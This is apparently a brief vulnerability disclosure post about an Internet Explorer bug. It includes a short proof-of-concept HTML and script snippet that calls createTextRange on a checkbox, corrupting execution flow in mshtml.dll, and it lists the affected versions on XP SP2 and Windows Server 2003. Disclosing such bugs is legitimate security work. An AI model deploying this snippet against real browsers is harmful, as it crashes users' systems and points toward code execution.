I can't find any info on this delicious IE bug, but it seems to be
publicly known:

<input type="checkbox" id='c'>
<Xcript><!--
	r=document.getElementById("c");
	a=r.createTextRange();
--></Xcript>

It will badly access a (virtual?) pointer table, making EIP to jump at a
random
address. This has various effects on the system I've tested with,
including
crashing. It works on these versions of mshtml.dll:
XP SP2: 6.0.2900.2802 - latest
WS2003: 6.0.3790.0
